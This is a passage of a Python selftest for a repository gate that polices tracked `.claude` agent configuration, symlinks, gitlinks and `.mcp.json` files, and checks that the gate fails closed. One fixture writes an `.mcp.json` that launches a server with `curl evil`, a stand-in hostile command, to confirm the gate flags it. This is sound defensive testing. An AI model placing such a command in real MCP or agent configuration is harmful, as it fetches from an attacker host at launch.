        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            _commands = os.path.join(tmp, ".claude", "commands")
            os.makedirs(_commands, exist_ok=True)
            _wrapper(_commands, "wip.md", "---\ndescription: d\nallowed-tools: Bash(*)\n---\n")
            _res = command_skill_result(_commands, os.path.join(tmp, ".claude", "skills"))
            check(
                _res.status == "fail"
                and any("wip.md" in line and "allowed-tools" in line for line in _res.lines)
                and any(
                    "`git add` them" in note and "cannot be cleared by it" in note
                    for note in _res.notes
                )
                and not any("run the gate inside" in line for line in _res.lines),
                "an UNTRACKED file in the checkout the index owns is walked and policed, with "
                "a `git add` note — not skipped with 'run inside the checkout'",
            )
    # ...while a tree that checkout does NOT own still SKIPs, and still says "run the gate
    # inside the git checkout that tracks these files". The enclosing repo here tracks
    # exactly ONE innocuous `export/.claude/keep`, which is the probe that separates "the
    # root has some entry" (not enough) from "the index covers a POLICED child" (PR-901
    # second round, RT-4). Killing mutant: `_root_owned_by_index` accepting any entry under
    # the root.
    with tempfile.TemporaryDirectory() as tmp:
        _enclosing = os.path.join(tmp, "enclosing")
        _export = os.path.join(_enclosing, "vendor", "export")
        _keep = os.path.join("vendor", "export", ".claude", "keep")
        os.makedirs(os.path.join(_export, ".claude", "skills", "demo"), exist_ok=True)
        _wrapper(
            os.path.join(_export, ".claude", "skills", "demo"),
            "SKILL.md",
            "---\nname: demo\ndescription: d\n---\n",
        )
        if _git_repo(_enclosing, {_keep: "x\n"}, [_keep]):
            _res = command_skill_result(
                os.path.join(_export, ".claude", "commands"),
                os.path.join(_export, ".claude", "skills"),
            )
            check(
                _res.status == "skip"
                and any(
                    "does not own" in line
                    and "run the gate inside the git checkout" in line
                    for line in _res.lines
                ),
                "an enclosing checkout that tracks ONE innocuous file under the export's "
                "`.claude` still does not OWN it: UNVERIFIED, 'run inside the checkout'",
            )
            # ...and `tracked-startup-config`, which queries the `.claude` ROOT rather than a
            # policed child, must reach the SAME verdict about the SAME tree. It used to
            # PASS: `export/.claude/keep` is an entry under the root, and "some entry exists
            # under it" short-circuited the coverage test before `_root_owned_by_index` was
            # ever consulted — one report carrying two verdicts about one foreign tree, the
            # green one on the check that polices `.mcp.json` and `settings.local.json`
            # (PR-901 SRE addendum). Killing mutant: restoring the short-circuit, i.e.
            # accepting any entry under a `.claude` root as coverage of it.
            _sc = startup_config_result(
                os.path.join(_export, ".mcp.json"),
                os.path.join(_export, ".claude", "settings.local.json"),
                os.path.join(_export, ".claude", "settings.json"),
            )
            check(
                _sc.status == "skip"
                and any(
                    "does not own" in line
                    and "run the gate inside the git checkout" in line
                    for line in _sc.lines
                ),
                "tracked-startup-config reaches the SAME 'does not own' verdict as the other "
                "local checks on an export inside an enclosing checkout",
            )

    # (e6a) F-1: a coverage failure must never DISCARD what git already named. A `.claude`
    # whose only tracked entry is a `hooks` SYMLINK — agents/, skills/ and settings.json
    # sitting untracked beside it — is a tree this index does not own, and the reason for
    # saying so is true. But the 120000 entry is ALSO true, and returning `(None, reason)`
    # threw it away: three SKIPs, exit 0, and a tracked link to `../obj/hooks` never named
    # in a report whose SKIP text told the operator the checkout "does not own" the very
    # directory the link is in. Both travel now — a FAIL on the link, the reason attached as
    # an ALSO UNVERIFIED note.
    # Killing mutant: returning `None` (dropping `findings`) on a coverage failure.
    with tempfile.TemporaryDirectory() as tmp:
        _claude = os.path.join(tmp, ".claude")
        os.makedirs(os.path.join(_claude, "agents"), exist_ok=True)
        os.makedirs(os.path.join(_claude, "skills", "demo"), exist_ok=True)
        _wrapper(os.path.join(_claude, "agents"), "a.md", "---\nname: a\ndescription: d\n---\n")
        _wrapper(
            os.path.join(_claude, "skills", "demo"),
            "SKILL.md",
            "---\nname: demo\ndescription: d\n---\n",
        )
        _wrapper(_claude, "settings.json", '{"permissions": {}}\n')
        if _git_repo(tmp, {}, []) and _cacheinfo(
            tmp, "120000", ".claude/hooks", "../obj/hooks"
        ):
            _lines, _statuses = _local_link_report(tmp)
            _sc = startup_config_result(
                os.path.join(tmp, ".mcp.json"),
                os.path.join(tmp, ".claude", "settings.local.json"),
                os.path.join(tmp, ".claude", "settings.json"),
            )
            check(
                _statuses == ["fail", "fail", "fail"]
                and sum(
                    ".claude/hooks" in line and "120000" in line for line in _lines
                ) == 3
                and any(
                    "ALSO UNVERIFIED" in note and "does not own" in note
                    for note in _sc.notes
                ),
                "a tracked `.claude/hooks` link is NAMED by all three link-asking checks even "
                "when the `.claude` around it is a tree the index does not own — the coverage "
                "reason rides along as an ALSO UNVERIFIED note instead of erasing the link",
            )

    # (e6b) F-2: an ANCESTOR gitlink is not git's answer about the tree below it. The
    # enclosing index records `vendor` as mode 160000 and has NOTHING under it, so every
    # query about `vendor/deltasharp/.claude` came back empty and read as CLEAN — four
    # unqualified PASSes over an export populated by hand, with a tracked-looking `.mcp.json`
    # reported as "not policed". "An entry at or above the queried path is git's whole
    # answer" holds for a gitlink AT the `.claude` root (that submodule IS the tree), not for
    # one ABOVE it, which says only "another repository lives here and I have not
    # initialized it".
    # Killing mutant: treating an ancestor 160000 entry as coverage (the old unconditional
    # "entry at or above" short-circuit).
    with tempfile.TemporaryDirectory() as tmp:
        _export = os.path.join(tmp, "vendor", "deltasharp")
        os.makedirs(os.path.join(_export, ".claude", "agents"), exist_ok=True)
        os.makedirs(os.path.join(_export, ".claude", "skills", "demo"), exist_ok=True)
        _wrapper(
            os.path.join(_export, ".claude", "agents"),
            "a.md",
            "---\nname: a\ndescription: d\n---\n",
        )
        _wrapper(
            os.path.join(_export, ".claude", "skills", "demo"),
            "SKILL.md",
            "---\nname: demo\ndescription: d\n---\n",
        )
        _wrapper(_export, ".mcp.json", '{"mcpServers": {"x": {"command": "curl evil"}}}\n')
        if _git_repo(
            tmp, {os.path.join("docs", "README.md"): "x\n"}, [os.path.join("docs", "README.md")]
        ) and _cacheinfo(tmp, "160000", "vendor", "gitlink\n"):
            _lines, _statuses = _local_link_report(_export)
            check(
                _statuses == ["skip", "skip", "skip"]
                and sum(
                    "submodule directory this checkout has not initialized" in line
                    for line in _lines
                ) == 3
                # ...and the narrow `_tracked_links` question keeps its ``None`` contract on a
                # PARTIAL answer: "found nothing in the part I could see" is not "there are
                # no links". Killing mutant: returning the empty list there.
                and _tracked_links(
                    link_query_paths(os.path.join(_export, ".claude", "agents"))
                ) is None,
                "an export under an UNINITIALIZED submodule gitlink is UNVERIFIED in all "
                "three link-asking local checks, not cleared by an enclosing index that says nothing "
                "about it",
            )

    # (e6c) F-3: the coverage rule has to be SILENT on a tree the index fully covers. The
    # `.claude` root rule folds each policed child onto `prefix + (child,)`; spelling it
    # `(child,)` — a BARE component — matches nothing in a real checkout, so every clean run
    # of the gate would carry a spurious "`.claude`: 45 file(s) … `git add` them" note about
    # files that are all tracked. A note that fires on the healthy case is a note operators
    # learn to ignore.
    # Killing mutant: `(child,)` instead of `prefix + (child,)` in the per-child root rule.
    if needs(
        os.path.isdir(DEFAULT_AGENTS_DIR)
        and os.path.exists(DEFAULT_TAXONOMY)
        and os.path.exists(DEFAULT_FEATURE_FORM),
        "no real roster/taxonomy here: healthy-checkout silent-notes fixtures",
    ):
        _buffer = io.StringIO()
        with contextlib.redirect_stdout(_buffer):
            _exit = main(["--offline", "--repo", DEFAULT_REPO])
        _out = _buffer.getvalue()
        check_in_checkout(
            _exit == 0
            and _out.count("[PASS] ") == 4
            and "file(s) on disk are not in the index" not in _out,
            "this checkout's four LOCAL checks all PASS with ZERO coverage notes: the "
            "`git add` note never fires on a tree the index fully covers",
        )
    # ...and the same, on a fixture, so the assertion is not a property of the directory the
    # selftest happens to be started from.
    with tempfile.TemporaryDirectory() as tmp:
        _covered = {
            os.path.join(".claude", "agents", "a.md"): "---\nname: a\ndescription: d\n---\n",
            os.path.join(".claude", "commands", "c.md"): "---\ndescription: d\n---\n",
            os.path.join(".claude", "skills", "demo", "SKILL.md"): (
                "---\nname: demo\ndescription: d\n---\n"
            ),
            os.path.join(".claude", "settings.json"): '{"permissions": {}}\n',
        }
        if _git_repo(tmp, _covered, list(_covered)):
            _sc = startup_config_result(
                os.path.join(tmp, ".mcp.json"),
                os.path.join(tmp, ".claude", "settings.local.json"),
                os.path.join(tmp, ".claude", "settings.json"),
            )
            _cs = command_skill_result(
                os.path.join(tmp, ".claude", "commands"),
                os.path.join(tmp, ".claude", "skills"),
            )
            _rl, _ru, _rn = tracked_symlink_problems(
                link_query_paths(os.path.join(tmp, ".claude", "agents"))
            )
            check(
                _sc.status == "pass"
                and _cs.status == "pass"
                and (_rl, _ru) == ([], [])
                and not any(
                    "not in the index" in line
                    for line in list(_sc.lines) + list(_sc.notes)
                    + list(_cs.lines) + list(_cs.notes) + list(_rn)
                ),
                "a fixture whose four policed children are ALL tracked passes every local "
                "check with no coverage note",
            )

    # (e6d) SEC L-1: the `git add` note has to count the files it is ABOUT. Counting every
    # file under the queried root reported all of a 5-file `.claude` when its one uncovered
    # child held 2 — sending the reader to look for three untracked paths that do not exist,
    # and leaving them unsure which half of the report to believe.
    # Killing mutant: counting every file under the root instead of only the uncovered ones.
    with tempfile.TemporaryDirectory() as tmp:
        _tracked = {
            os.path.join(".claude", "agents", "a.md"): "---\nname: a\ndescription: d\n---\n",
            os.path.join(".claude", "skills", "demo", "SKILL.md"): (
                "---\nname: demo\ndescription: d\n---\n"
            ),
            os.path.join(".claude", "settings.json"): '{"permissions": {}}\n',
        }
        if _git_repo(tmp, _tracked, list(_tracked)):
            _commands = os.path.join(tmp, ".claude", "commands")
            os.makedirs(_commands, exist_ok=True)
            _wrapper(_commands, "wip.md", "---\ndescription: d\n---\n")
            _wrapper(_commands, "wip2.md", "---\ndescription: d\n---\n")
            _sc = startup_config_result(
                os.path.join(tmp, ".mcp.json"),
                os.path.join(tmp, ".claude", "settings.local.json"),
                os.path.join(tmp, ".claude", "settings.json"),
            )
            # A PASSING check carries its context in `lines` (that IS its evidence) and a
            # failing one in `notes`, so both are searched: the assertion is about the note's
            # TEXT, not about which field this verdict happened to put it in.
            _coverage = [
                line
                for line in list(_sc.lines) + list(_sc.notes)
                if "not in the index" in line
            ]
            check(
                _sc.status == "pass"
                and len(_coverage) == 1
                and _coverage[0].startswith(".claude: 2 file(s) on disk are not in the index")
                and _count_uncovered_disk_files(
                    os.path.join(tmp, ".claude"), (".claude",), []
                ) == 5,
                "the `git add` note counts only the files NO index entry covers (2 of the 5 "
                "under the root), so the number names the work the remedy asks for",
            )

    # ...and the manifest-leaf rule stays inside the POLICED skills tree: a slash-command
    # file at `.claude/commands/skills/skill.md` lives under a directory called `skills`, but
    # `SKILL.md` means nothing there and telling its author to rename it is a false positive
    # in the one check whose worth is that its findings are always real.
    # Killing mutant: matching a `skills` component at ANY depth (the old ancestor scan).
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "commands", "skills", "skill.md")
        if _git_repo(tmp, {_rel: "---\ndescription: d\n---\n"}, [_rel]):
            _problems, _unverified, _ = tracked_symlink_problems(
                link_query_paths(os.path.join(tmp, ".claude", "commands"))
            )
            check(
                not any("folds onto" in message for _path, message in _problems),
                "a tracked `.claude/commands/skills/skill.md` is NOT a manifest-name "
                "collision: the leaf rule is scoped to the policed `.claude/skills` tree",
            )

    # (e7) SRE L-2: the index listing is cached per work tree, so the several checks that ask
    # about `.claude` spend ONE subprocess — and a listing that FAILED is never re-asked into
    # a pass. Killing mutants: dropping the cache (the counter sees two calls); caching the
    # entries but not the `None`.
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            _calls = {"n": 0}
            _saved_run = subprocess.run

            def _counting_run(argv, *args, **kwargs):  # noqa: ANN001 - selftest shim
                if isinstance(argv, list) and argv[:2] == ["git", "ls-files"]:
                    _calls["n"] += 1
                return _saved_run(argv, *args, **kwargs)

            _LS_FILES_CACHE.clear()
            globals()["_LS_FILES_CACHE_ENABLED"] = True
            subprocess.run = _counting_run
            try:
                _first = command_skill_result(
                    os.path.join(tmp, ".claude", "commands"),
                    os.path.join(tmp, ".claude", "skills"),
                )
                _second = startup_config_result(
                    os.path.join(tmp, ".mcp.json"),
                    os.path.join(tmp, ".claude", "settings.local.json"),
                    os.path.join(tmp, ".claude", "settings.json"),
                )
                _shared = _calls["n"]
                # ...and a listing that FAILED stays failed for the whole run. Git answering
                # once and then recovering must not print one check's SKIP beside another's
                # PASS over the same index: one report, one verdict about one work tree.
                _LS_FILES_CACHE.clear()
                _flaky = {"n": 0}

                def _flaky_run(argv, *args, **kwargs):  # noqa: ANN001 - selftest shim
                    if isinstance(argv, list) and argv[:2] == ["git", "ls-files"]:
                        _flaky["n"] += 1
                        if _flaky["n"] == 1:
                            return subprocess.CompletedProcess(argv, 128, b"", b"boom")
                    return _saved_run(argv, *args, **kwargs)

                subprocess.run = _flaky_run
                _flaky_statuses = [
                    command_skill_result(
                        os.path.join(tmp, ".claude", "commands"),
                        os.path.join(tmp, ".claude", "skills"),
                    ).status,
                    startup_config_result(
                        os.path.join(tmp, ".mcp.json"),
                        os.path.join(tmp, ".claude", "settings.local.json"),
                        os.path.join(tmp, ".claude", "settings.json"),
                    ).status,
                ]
            finally:
                subprocess.run = _saved_run
                globals()["_LS_FILES_CACHE_ENABLED"] = False
                _LS_FILES_CACHE.clear()
            check(
                _first.status == "pass"
                and _second.status == "pass"
                and _shared == 1
                and _flaky_statuses == ["skip", "skip"],
                "the index listing is cached per work tree (two checks, one `git ls-files`) "
                "and a FAILED listing stays failed for the run — never one SKIP beside one "
                "PASS about the same index",
            )

    # (e8) A tracked path whose BYTES are not valid UTF-8. `subprocess(text=True)` decoded the
    # listing strictly and raised out of `_ls_files`, so the gate CRASHED (exit 2, "the gate
    # is broken") on a file an attacker chooses the name of. Surrogate-escaped, the entry is
    # reported — fail closed — and every message it appears in can still be printed.
    # Killing mutants: restoring `text=True`; dropping the `_is_undecodable` finding.
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            if _cacheinfo(tmp, "100644", ".claude/skills/evil/\udcffkill.md", "x\n"):
                _res = command_skill_result(
                    os.path.join(tmp, ".claude", "commands"),
                    os.path.join(tmp, ".claude", "skills"),
                )
                _rendered = "\n".join(_res.lines).encode("utf-8", "strict")
                check(
                    _res.status == "fail"
                    and any("not valid UTF-8" in line for line in _res.lines)
                    and b"kill.md" in _rendered,
                    "a tracked path whose bytes are not UTF-8 is REPORTED (and printable), "
                    "never a decode crash the runner reads as a broken gate",
                )

    # (f) A path containing BOTH quote characters. `repr` switches to double quotes for a
    # path holding an apostrophe and ESCAPES the apostrophe when the path holds a double
    # quote too, so no pattern over the rendered message can recover it: one link printed as
    # two defects (PR-901 F-D and, at the second round, L-1). Nothing is parsed out of the
    # text any more — every producer carries its path structurally.
    # Killing mutants: reintroducing a message-text key in `_dedupe_link_problems`; dropping
    # the `path`/`kind` attributes from `_LinkMessage`.
    # The MARKER is a fragment `repr` never escapes: a path holding both quotes is rendered
    # single-quoted with the apostrophe backslash-escaped, so the raw name is not a substring
    # of the message at all — which is exactly why the key cannot be the message text.
    for _weird, _marker, _label in (
        ("it's", "it's", "an apostrophe"),
        ("a'b\"c", 'b"c', "both quote characters"),
    ):
        with tempfile.TemporaryDirectory() as tmp:
            _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
            if not _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
                break
            _skills = os.path.join(tmp, ".claude", "skills")
            _weird_path = os.path.join(_skills, _weird)
            if not _dangling(_weird_path, "../../obj/weird"):
                break
            subprocess.run(
                ["git", "add", "-f", "--", _weird_path],
                cwd=tmp, capture_output=True, text=True, timeout=60,
            )
            _res = command_skill_result(os.path.join(tmp, ".claude", "commands"), _skills)
            check(
                _res.status == "fail"
                and sum(_marker in line for line in _res.lines) == 1
                and any("120000" in line and _marker in line for line in _res.lines),
                f"a tracked link whose path holds {_label} is reported exactly ONCE",
            )

    # (f2) De-duplication must not become DELETION. Two DIFFERENT links are two findings, and
    # an integrity sentence that quotes a link clause ("no persona wrappers found … because
    # `.claude` is a tracked gitlink") is a THIRD, different finding from the bare gitlink
    # line — the message-matching key dropped it, leaving the operator with an empty roster
    # and no explanation (PR-901 second round, RT-5).
    # Killing mutants: keying the dedupe on the path alone (drops the second link's kind);
    # keying plain messages by a regex over their text (drops the roster sentence).
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            _skills = os.path.join(tmp, ".claude", "skills")
            _one = os.path.join(_skills, "one-link")
            _two = os.path.join(tmp, ".claude", "hooks")
            if _dangling(_one, "../../obj/one") and _dangling(_two, "../obj/two"):
                subprocess.run(
                    ["git", "add", "-f", "--", _one, _two],
                    cwd=tmp, capture_output=True, text=True, timeout=60,
                )
                _res = command_skill_result(os.path.join(tmp, ".claude", "commands"), _skills)
                check(
                    _res.status == "fail"
                    and sum("one-link" in line for line in _res.lines) == 1
                    and sum(os.path.join(".claude", "hooks") in line for line in _res.lines) == 1,
                    "two DISTINCT tracked links are two findings; de-duplication keeps both",
                )
    if needs(
        os.path.exists(DEFAULT_TAXONOMY),
        "no real taxonomy here: nested-checkout coverage fixtures",
    ):
        with tempfile.TemporaryDirectory() as tmp:
            _inner = os.path.join(tmp, "inner")
            _outer = os.path.join(tmp, "outer")
            os.makedirs(_inner, exist_ok=True)
            os.makedirs(_outer, exist_ok=True)
            if (
                _git_repo(_inner, {"keep": "x\n"}, ["keep"])
                and _git_run(_inner, "commit", "-qm", "inner")
                and _git_repo(_outer, {"README.md": "outer\n"}, ["README.md"])
                and _git_run(_outer, "commit", "-qm", "outer")
                and _git_run(_outer, "submodule", "add", "-q", _inner, ".claude")
            ):
                _buffer = io.StringIO()
                with contextlib.redirect_stdout(_buffer):
                    _exit = main(
                        [
                            "--offline",
                            "--repo", DEFAULT_REPO,
                            "--agents-dir", os.path.join(_outer, ".claude", "agents"),
                        ]
                    )
                _output = _buffer.getvalue()
                _bare = [
                    line
                    for line in _output.splitlines()
                    if line.strip().startswith("- " + repr(".claude") + " is a tracked gitlink")
                ]
                check(
                    _exit == 1
                    and "no persona wrappers found" in _output
                    and len(_bare) == 1,
                    "the roster's 'no persona wrappers found … gitlink' sentence SURVIVES "
                    "de-duplication beside the bare gitlink line, which prints once",
                )

    # (i) An UNTRACKED `.claude` symlink: git's index says nothing, so the `os.path.islink`
    # guard in `startup_config_result` is the only thing that sees it — and it was asserted
    # nowhere. Killing mutant: deleting that guard.
    with tempfile.TemporaryDirectory() as tmp:
        _repo = os.path.join(tmp, "repo")
        os.makedirs(os.path.join(tmp, "elsewhere"), exist_ok=True)
        os.makedirs(_repo, exist_ok=True)
        if _git_repo(_repo, {"README.md": "x\n"}, ["README.md"]) and _relink(
            os.path.join("..", "elsewhere"), os.path.join(_repo, ".claude")
        ):
            _res = startup_config_result(
                os.path.join(_repo, ".mcp.json"),
                os.path.join(_repo, ".claude", "settings.local.json"),
                os.path.join(_repo, ".claude", "settings.json"),
            )
            check(
                _res.status == "fail"
                and sum(
                    os.path.join(_repo, ".claude") in line and "is a symlink" in line
                    for line in _res.lines
                ) == 1,
                "an UNTRACKED `.claude` symlink still FAILS tracked-startup-config, once",
            )
    # --- LAST-CERT F3: FAIL-CLOSED. "git could not answer" must reach the operator as SKIP,
    # never as a pass — the half of the contract that was asserted for the TRACKING question
    # but never for the LINK question. These are unit-level (independent of the directory the
    # selftest happens to run from) plus one end-to-end EXPORT fixture: a `git archive` tree
    # with no `.git` at all, which is what a release tarball or a vendored copy looks like.
    # Killing mutants: `returncode != 0 -> return []`; `which("git") is None -> []`; an
    # `or []` at the call sites; treating unverified as pass in the cmd/skill or roster check.
    with tempfile.TemporaryDirectory() as tmp:
        if _git_toplevel(tmp) is not None:  # pragma: no cover - TMPDIR inside a checkout
            skip("the temp directory is inside a git checkout: fail-closed unit tests")
        else:
            _outside = os.path.join(tmp, "skills")
            check(
                _tracked_links([_outside]) is None,
                "_tracked_links returns None (not []) when git cannot answer outside a checkout",
            )
            _problems, _unverified, _ = tracked_symlink_problems([_outside])
            check(
                _problems == []
                and len(_unverified) == 1
                and "git could not say" in _unverified[0]
                and "submodules" in _unverified[0],
                "tracked_symlink_problems reports UNVERIFIED, never clean, when git cannot answer",
            )
    _saved_which = shutil.which
    try:
        shutil.which = lambda *_a, **_k: None
        check(
            _tracked_links([os.path.join(os.getcwd(), ".claude")]) is None,
            "_tracked_links returns None when git is not on PATH (no silent 'no links')",
        )
    finally:
        shutil.which = _saved_which
    if needs(
        os.path.isdir(DEFAULT_AGENTS_DIR)
        and os.path.isdir(DEFAULT_SKILLS_DIR)
        and os.path.exists(DEFAULT_SETTINGS)
        and os.path.exists(DEFAULT_TAXONOMY),
        "no real .claude tree here: `git archive` export (non-checkout) fixtures",
    ):
        with tempfile.TemporaryDirectory() as tmp:
            _src = os.path.join(tmp, "src")
            _export = os.path.join(tmp, "export")
            _tar = os.path.join(tmp, "export.tar")
            os.makedirs(os.path.join(_src, ".claude"), exist_ok=True)
            os.makedirs(_export, exist_ok=True)
            shutil.copytree(DEFAULT_AGENTS_DIR, os.path.join(_src, ".claude", "agents"))
            shutil.copytree(DEFAULT_SKILLS_DIR, os.path.join(_src, ".claude", "skills"))
            shutil.copyfile(DEFAULT_SETTINGS, os.path.join(_src, ".claude", "settings.json"))
            _exported = (
                _git_repo(_src, {}, [".claude"])
                and _git_run(_src, "commit", "-qm", "export")
                and _git_run(_src, "archive", "--format=tar", "-o", _tar, "HEAD")
            )
            if _exported:
                try:
                    with tarfile.open(_tar) as _handle:
                        _handle.extractall(_export)
                except (tarfile.TarError, OSError):  # pragma: no cover - environment
                    _exported = False
            if not _exported:
                skip("git archive unavailable: export (non-checkout) fixtures not run")
            else:
                _export_args = [
                    "--offline",
                    "--repo",
                    DEFAULT_REPO,
                    "--agents-dir", os.path.join(_export, ".claude", "agents"),
                    "--skills-dir", os.path.join(_export, ".claude", "skills"),
                    "--commands-dir", os.path.join(_export, ".claude", "commands"),
                    "--settings", os.path.join(_export, ".claude", "settings.json"),
                    "--mcp-config", os.path.join(_export, ".mcp.json"),
                ]
                _res = command_skill_result(
                    os.path.join(_export, ".claude", "commands"),
                    os.path.join(_export, ".claude", "skills"),
                )
                check(
                    _res.status == "skip"
                    and any("git could not say" in line for line in _res.lines),
                    "command-skill-frontmatter SKIPs in an export (no .git to ask), never passes",
                )
                _buffer = io.StringIO()
                with contextlib.redirect_stdout(_buffer):
                    _exit = main(list(_export_args))
                _output = _buffer.getvalue()
                check(
                    _exit == 0
                    and "[SKIP] roster<->documented-labels" in _output
                    and "[SKIP] command-skill-frontmatter" in _output
                    and "[SKIP] tracked-startup-config" in _output
                    and "[FAIL]" not in _output,
                    "an export SKIPs all three link-asking local checks (content still read)",
                )
                # LAST-CERT F5: the success line must not claim the surfaces a SKIPPED check
                # owns are "in step" — that sentence is the one line a passer-by reads.
                # Killing mutant: restoring the unconditional "are in step" sentence.
                check(
                    "reconciliation passed on the checks that ran" in _output
                    and "check(s) skipped (see warnings above)" in _output
                    and "are in step" not in _output,
                    "a run with skips reports a QUALIFIED success line, not 'are in step'",
                )
                # ...and the remote-skip warning must not claim the LOCAL checks passed
                # while the very next line reports that some of them could not verify their
                # input (PR-901, reported as Info). Killing mutant: restoring the
                # unconditional "reconciliation passed locally".
                check(
                    "reconciliation passed locally" not in _output
                    and "local check(s) could not verify their input" in _output
                    and "remote check(s) skipped" in _output,
                    "the remote-skip warning does not claim 'passed locally' when local "
                    "checks could not verify their input",
                )
                _buffer = io.StringIO()
                with contextlib.redirect_stdout(_buffer):
                    _exit = main(list(_export_args) + ["--require-remote"])
                _output = _buffer.getvalue()
                check(
                    _exit == 2
                    and "local check(s) could not verify their input" in _output
                    and "required remote check(s) were unavailable" not in _output,
                    "an export under --require-remote exits 2 with the LOCAL environment message",
                )

    # --- FINAL-CERT F2: the SKIP partition. A local check that could not verify its input
    # exits 2 with the LOCAL message — never the remote-outage one, which would send a
    # responder to wait out an outage that never happened. `tracked-startup-config` is a
    # LOCAL check (its one subprocess is `git ls-files` in the checkout), so it must not be
    # in REMOTE_CHECK_NAMES. Killing mutants: adding it there; reverting the two messages to
    # a single one; checking the remote partition first.
    check(
        "tracked-startup-config" not in REMOTE_CHECK_NAMES
        and "command-skill-frontmatter" not in REMOTE_CHECK_NAMES
        and "roster<->documented-labels" not in REMOTE_CHECK_NAMES
        and REMOTE_CHECK_NAMES
        == frozenset({"roster<->live-labels", "codeowners-errors", "milestone-dropdown"}),
        "REMOTE_CHECK_NAMES holds exactly the three GitHub-API checks (literal set)",
    )
    if needs(
        os.path.isdir(DEFAULT_AGENTS_DIR) and os.path.exists(DEFAULT_TAXONOMY),
        "no real roster/taxonomy here: unverifiable-local exit-2 fixtures",
    ):
        with tempfile.TemporaryDirectory() as tmp:
            # NOT a git checkout: git cannot say whether this .mcp.json is tracked, so the
            # local check SKIPs and --require-remote makes that exit 2 with the environment
            # message. The remote checks are skipped BY REQUEST here (--offline), which is
            # exactly the case that used to print "remote outage".
            # A TMPDIR inside a checkout makes the .mcp.json answerable and the fixture
            # unbuildable, so this group SKIPs there rather than hard-failing (PR-901 fourth
            # round, F3); `--require-full-coverage` turns that skip back into a failure.
            if _git_toplevel(tmp) is not None:  # pragma: no cover - TMPDIR in a checkout
                skip("the temp directory is inside a git checkout: unverifiable-local exit 2")
            else:
                with open(os.path.join(tmp, ".mcp.json"), "w", encoding="utf-8") as handle:
                    handle.write(_mcp_evil)
                _buffer = io.StringIO()
                with contextlib.redirect_stdout(_buffer):
                    _exit = main(
                        [
                            "--offline",
                            "--require-remote",
                            "--repo",
                            DEFAULT_REPO,
                            "--mcp-config",
                            os.path.join(tmp, ".mcp.json"),
                        ]
                    )
                _output = _buffer.getvalue()
                check(
                    _exit == 2
                    and "local check(s) could not verify their input" in _output
                    and "tracked-startup-config" in _output
                    # The phrase "remote outage" occurs INSIDE the local message ("not a
                    # remote outage"), so what must be absent is the outage VERDICT sentence.
                    and "required remote check(s) were unavailable" not in _output,
                    "an unverifiable LOCAL check exits 2 with the environment message, not "
                    "'outage'",
                )
    with tempfile.TemporaryDirectory() as tmp:
        # A tracked `.mcp.json` whose `mcpServers` is a LIST: the gate cannot enumerate what
        # would start at launch, so it FAILS rather than reading the non-mapping as empty.
        # Killing mutant: collapsing a non-dict mcpServers into `{}`.
        if _git_repo(tmp, {".mcp.json": '{"mcpServers": []}'}, [".mcp.json"]):
            _problems, _, _unverified = validate_startup_config(
                os.path.join(tmp, ".mcp.json"), os.path.join(tmp, ".claude", "settings.local.json")
            )
            check(
                len(_problems) == 1
                and "'mcpServers' is list, not an object" in _problems[0]
                and _unverified == [],
                "a tracked .mcp.json whose mcpServers is a LIST fails, not reads as empty",
            )

    # --- FINAL-CERT F5: notes are context, not verdict. A failing check must not raise an
    # `::error::` annotation against "no .claude/settings.local.json in the checkout" — an
    # inline PR error on a reassuring FACT sends a reviewer hunting a defect in it.
    # Killing mutant: `Result(..., "fail", problems + notes)`.
    with tempfile.TemporaryDirectory() as tmp:
        if _git_repo(tmp, {".mcp.json": _mcp_evil}, [".mcp.json"]):
            _local = os.path.join(tmp, ".claude", "settings.local.json")
            _res = startup_config_result(
                os.path.join(tmp, ".mcp.json"), _local, os.path.join(tmp, ".claude", "settings.json")
            )
            _buffer = io.StringIO()
            with contextlib.redirect_stdout(_buffer):
                _print_summary([_res])
            _annotations = [
                line for line in _buffer.getvalue().splitlines() if line.startswith("::error::")
            ]
            check(
                _res.status == "fail"
                and any("no " + _local + " in the checkout" in note for note in _res.notes)
                and _annotations
                and not any("in the checkout" in line for line in _annotations)
                and any("in the checkout" in line for line in _buffer.getvalue().splitlines()),
                "a failing check annotates its problems only; notes print as plain detail",
            )

    # The real checkout must be clean on this surface, and the check must be WIRED INTO the
    # gate: a tracked .mcp.json has to redden a full run. Killing mutant: deleting the
    # `results.append(startup_config_result(...))` line in run_checks.
    if needs(
        os.path.isdir(DEFAULT_AGENTS_DIR) and os.path.exists(DEFAULT_TAXONOMY),
        "no real roster/taxonomy here: tracked .mcp.json gate-wiring fixtures",
    ):
        with tempfile.TemporaryDirectory() as tmp:
            if _git_repo(tmp, {".mcp.json": _mcp_evil}, [".mcp.json"]):
                _buffer = io.StringIO()
                with contextlib.redirect_stdout(_buffer):
                    _exit = main(
                        [
                            "--offline",
                            "--repo",
                            DEFAULT_REPO,
                            "--mcp-config",
                            os.path.join(tmp, ".mcp.json"),
                        ]
                    )
                check(
                    "[FAIL] tracked-startup-config" in _buffer.getvalue() and _exit == 1,
                    "run_checks reports tracked-startup-config and a tracked .mcp.json exits 1",
                )
        _buffer = io.StringIO()
        with contextlib.redirect_stdout(_buffer):
            _exit = main(["--offline", "--repo", DEFAULT_REPO])
        _output = _buffer.getvalue()
        # FINAL-CERT F3: assert the GATE, not the ambient machine. A developer may keep an
        # UNTRACKED local .mcp.json (that is the supported way to run an MCP server here), and
        # a selftest that demands the "no .mcp.json in the checkout" note turns red on their
        # machine for a state the gate deliberately allows — training people to ignore a red
        # selftest. What must hold is that the check did not FAIL, and that the default path
        # is the repo-root .mcp.json: the note then reads either way.
        check(
            "[FAIL] tracked-startup-config" not in _output and _exit == 0,
            "this checkout is clean on the tracked-startup-config surface",
        )
        check(
            "no .mcp.json in the checkout" in _output
            or ".mcp.json present locally" in _output,
